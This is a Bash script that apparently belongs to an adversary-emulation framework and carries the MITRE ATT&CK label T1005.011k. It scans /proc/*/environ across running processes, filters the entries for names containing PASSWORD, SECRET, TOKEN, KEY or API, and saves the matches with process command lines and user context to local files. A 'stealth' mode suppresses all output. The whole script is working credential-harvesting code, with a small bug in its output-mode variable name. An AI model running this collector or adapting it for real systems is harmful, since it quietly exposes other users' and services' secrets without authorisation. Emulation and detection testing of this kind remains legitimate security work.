
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1005_011K_DEBUG_MODE="${T1005_011K_DEBUG_MODE:-false}"
    export T1005_011K_TIMEOUT="${T1005_011K_TIMEOUT:-300}"
    export T1005_011K_FALLBACK_MODE="${T1005_011K_FALLBACK_MODE:-real}"
    export T1005_011K_OUTPUT_FORMAT="${T1005_011K_OUTPUT_FORMAT:-json}"
    export T1005_011K_POLICY_CHECK="${T1005_011K_POLICY_CHECK:-true}"
    export T1005_011K_MAX_FILES="${T1005_011K_MAX_FILES:-200}"
    export T1005_011K_MAX_FILE_SIZE="${T1005_011K_MAX_FILE_SIZE:-1048576}"
    export T1005_011K_SCAN_DEPTH="${T1005_011K_SCAN_DEPTH:-3}"
    export T1005_011K_EXCLUDE_CACHE="${T1005_011K_EXCLUDE_CACHE:-true}"
    export T1005_011K_CAPTURE_DURATION="${T1005_011K_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1005.011k - Data from Local System: Environment Variables Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract environment variables from processes ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat ps; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

# Environment variables loading
Load-EnvironmentVariables() {
    export T1005_011K_OUTPUT_BASE="${T1005_011K_OUTPUT_BASE:-./mitre_results}"
    export T1005_011K_TIMEOUT="${T1005_011K_TIMEOUT:-300}"
    export T1005_011K_OUTPUT_MODE="${T1005_011K_OUTPUT_MODE:-simple}"
    export T1005_011K_SILENT_MODE="${T1005_011K_SILENT_MODE:-false}"
    export T1005_011K_MAX_PROCESSES="${T1005_011K_MAX_PROCESSES:-100}"
    
    export T1005_011K_PROC_PATHS="${T1005_011K_PROC_PATHS:-/proc/*/environ}"
    export T1005_011K_FILTER_PATTERNS="${T1005_011K_FILTER_PATTERNS:-*PASSWORD*,*SECRET*,*TOKEN*,*KEY*,*API*}"
    export T1005_011K_INCLUDE_SYSTEM="${T1005_011K_INCLUDE_SYSTEM:-false}"
    export T1005_011K_MIN_LENGTH="${T1005_011K_MIN_LENGTH:-5}"
    export T1005_011K_EXCLUDE_COMMON="${T1005_011K_EXCLUDE_COMMON:-true}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1005_011K_OUTPUT_BASE" ]] && { [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1005_011K_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1005_011K_OUTPUT_BASE")" ]] && { [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    [[ ! -d "/proc" ]] && { [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] /proc filesystem not available"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1005_011K_OUTPUT_BASE/T1005_011k_environment_vars_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{env_vars,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Process environment variables collection
Collect-ProcessEnvVars() {
    local proc_path="$1" collection_dir="$2"
    
    [[ ! -f "$proc_path" || ! -r "$proc_path" ]] && return 1
    
    local pid=$(echo "$proc_path" | sed 's|/proc/\([0-9]*\)/environ|\1|')
    local cmdline_file="/proc/$pid/cmdline"
    [[ ! -f "$cmdline_file" ]] && return 1
    
    local cmdline=$(tr '\0' ' ' < "$cmdline_file" 2>/dev/null | head -c 100)
    local env_content=$(tr '\0' '\n' < "$proc_path" 2>/dev/null)
    
    # Filter for sensitive variables
    local filtered_env=""
    IFS=',' read -ra patterns <<< "$T1005_011K_FILTER_PATTERNS"
    
    while IFS= read -r env_line; do
        [[ ${#env_line} -lt ${T1005_011K_MIN_LENGTH:-5} ]] && continue
        
        for pattern in "${patterns[@]}"; do
            pattern=$(echo "$pattern" | xargs | tr -d '*')
            if [[ "$env_line" == *"$pattern"* ]]; then
                filtered_env+="$env_line"$'\n'
                break
            fi
        done
    done <<< "$env_content"
    
    if [[ -n "$filtered_env" ]]; then
        local safe_name="envvars_pid_${pid}_$(date +%s)"
        echo -e "Process: $cmdline\nPID: $pid\n\n$filtered_env" > "$collection_dir/env_vars/$safe_name"
        echo "$proc_path:${#filtered_env}"
        [[ "$T1005_011K_SILENT_MODE" != "true" && "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "  + Collected: PID $pid (${#filtered_env} bytes)" >&2
        return 0
    fi
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1005_011K_SILENT_MODE is true
    [[ "$T1005_011K_SILENT_MODE" != "true" && "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "ENVIRONMENT VARS EXTRACTION "
    echo "Processes: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1005.011k",
    "results": {
        "processes_collected": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1005_011K_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting environment variables..."
    
    # Adaptive timeout logic for testing
    local effective_max_processes="$T1005_011K_MAX_PROCESSES"
    if [[ "${T1005_011K_TIMEOUT:-300}" -lt 30 ]]; then
        [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Test mode detected, limiting to 5 processes" >&2
        effective_max_processes=5
    elif [[ "${T1005_011K_TIMEOUT:-300}" -lt 120 ]]; then
        [[ "${T1005_011K_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Quick mode detected, limiting to 20 processes" >&2
        effective_max_processes=20
    fi
    
    # ATOMIC ACTION: Orchestration of auxiliary functions with timeout protection
    local start_time=$(date +%s)
    for proc_environ in /proc/*/environ; do
        [[ ! -f "$proc_environ" ]] && continue
        
        # Check timeout during processing
        local current_time=$(date +%s)
        [[ $((current_time - start_time)) -ge $((T1005_011K_TIMEOUT - 2)) ]] && break
        
        if result=$(Collect-ProcessEnvVars "$proc_environ" "$collection_dir"); then
            IFS=':' read -r file_path file_size <<< "$result"
            collected_files+=("$file_path")
            total_size=$((total_size + file_size))
            ((file_count++))
            [[ $file_count -ge ${effective_max_processes:-100} ]] && break
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${TT1005_011K_OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected processes collected"
    exit 0
}

# Execute
Main "$@"